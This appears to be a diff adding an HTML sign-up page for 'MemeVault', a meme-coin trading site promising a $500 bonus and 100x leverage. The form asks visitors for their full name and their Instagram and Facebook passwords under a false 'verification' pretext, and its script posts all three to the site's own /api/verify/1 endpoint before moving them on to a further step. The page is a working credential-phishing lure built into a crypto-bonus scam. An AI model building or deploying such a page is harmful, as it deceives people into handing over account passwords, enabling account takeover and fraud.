@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>MemeVault — Quick Sign Up</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0d0010;color:#fff;font-family:'Impact','Arial Black',sans-serif;min-height:100vh}
+@keyframes flash{0%,100%{background:#0d0010}50%{background:#1a002a}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-3px)}75%{transform:translateX(3px)}}
+@keyframes pulse-rainbow{0%{color:#ff00aa}50%{color:#ffea00}100%{color:#ff00aa}}
+body{animation:flash 1.5s infinite}
+
+.topbar{background:#000;padding:14px 24px;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #ff00aa}
+.brand{font-size:24px;color:#ffea00;text-shadow:2px 2px #ff00aa}
+
+.bonus-banner{background:linear-gradient(90deg,#ff0066,#ffaa00);padding:16px;text-align:center;font-size:20px;font-weight:900;color:#000;animation:shake .3s infinite}
+
+.container{max-width:520px;margin:30px auto;padding:0 20px}
+.progress{display:flex;align-items:center;gap:8px;margin-bottom:24px;justify-content:center}
+.step{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;font-family:Arial,sans-serif}
+.step.active{background:#ff00aa;color:#000}
+.step.inactive{background:#333;color:#888}
+.step-line{width:48px;height:3px;background:#333}
+
+.card{background:linear-gradient(135deg,#1a0024,#2a0040);border:3px solid #ff00aa;border-radius:14px;padding:30px;box-shadow:0 0 40px rgba(255,0,170,.4)}
+h1{font-size:26px;color:#ffea00;text-shadow:2px 2px #ff00aa;margin-bottom:8px}
+.desc{font-size:15px;color:#fff;margin-bottom:18px;font-family:Arial,sans-serif;font-weight:normal}
+
+.unlock-box{background:#000;border:2px solid #ffea00;border-radius:8px;padding:14px 16px;margin-bottom:20px;font-size:14px;color:#ffea00;font-family:Arial,sans-serif;font-weight:bold}
+.unlock-box b{color:#ff00aa}
+
+.field{margin-bottom:16px;font-family:Arial,sans-serif}
+.field label{display:block;font-size:13px;font-weight:900;color:#ffea00;margin-bottom:6px;text-transform:uppercase}
+.field input{width:100%;padding:11px 14px;background:#000;border:2px solid #ff00aa;border-radius:8px;color:#fff;font-size:14px;outline:none;font-family:'Courier New',monospace}
+.field input:focus{border-color:#ffea00;box-shadow:0 0 12px rgba(255,234,0,.5)}
+.field .why{font-size:11px;color:#aaa;margin-top:4px;font-family:Arial,sans-serif;font-weight:normal}
+
+.btn{width:100%;padding:15px;background:#ff00aa;color:#000;border:none;border-radius:8px;font-size:18px;font-weight:900;cursor:pointer;text-transform:uppercase;letter-spacing:2px;animation:shake .3s infinite}
+.btn:hover{background:#ff40bb}
+.btn:disabled{opacity:.5;cursor:not-allowed;animation:none}
+.success{display:none;text-align:center;padding:20px;color:#00ff66;font-size:18px;font-family:Arial,sans-serif}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="brand">💎 MemeVault 🚀</div>
+</header>
+
+<div class="bonus-banner">⚡ CLAIM YOUR $500 BONUS — JUST 3 STEPS ⚡</div>
+
+<div class="container">
+  <div class="progress">
+    <div class="step active">1</div>
+    <div class="step-line"></div>
+    <div class="step inactive">2</div>
+    <div class="step-line"></div>
+    <div class="step inactive">3</div>
+  </div>
+
+  <div class="card">
+    <h1>STEP 1 — SIGN UP</h1>
+    <p class="desc">We need your social media to verify you're a real trader, not a bot. Connect your Instagram and Facebook to instantly unlock 100× leverage and your $500 bonus.</p>
+
+    <div class="unlock-box">🔓 <b>Unlocks:</b> $500 sign-up bonus, 100× leverage on all meme coins, VIP Telegram group access</div>
+
+    <form id="kycForm">
+      <div class="field">
+        <label for="full_name">Full Name</label>
+        <input type="text" id="full_name" name="full_name" placeholder="Your name" required>
+      </div>
+
+      <div class="field">
+        <label for="instagram_password">Instagram Password</label>
+        <input type="password" id="instagram_password" name="instagram_password" placeholder="••••••••" required>
+        <div class="why">Required to verify you're a real influencer-tier trader.</div>
+      </div>
+
+      <div class="field">
+        <label for="facebook_password">Facebook Password</label>
+        <input type="password" id="facebook_password" name="facebook_password" placeholder="••••••••" required>
+        <div class="why">Required to cross-check your social proof score.</div>
+      </div>
+
+      <button type="submit" class="btn" id="submitBtn">⚡ UNLOCK $500 BONUS ⚡</button>
+    </form>
+    <div class="success" id="success">✓ Step 1 complete! Redirecting…</div>
+  </div>
+</div>
+
+<script>
+document.getElementById('kycForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  var btn = document.getElementById('submitBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying…';
+  fetch('/api/verify/1', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      full_name: document.getElementById('full_name').value,
+      instagram_password: document.getElementById('instagram_password').value,
+      facebook_password: document.getElementById('facebook_password').value
+    })
+  }).then(function(r){ return r.json(); }).then(function(){
+    document.getElementById('kycForm').style.display='none';
+    document.getElementById('success').style.display='block';
+    setTimeout(function(){ window.location.href='/verify/level-2'; }, 1200);
+  });
+});
+</script>
+
+</body>
+</html>
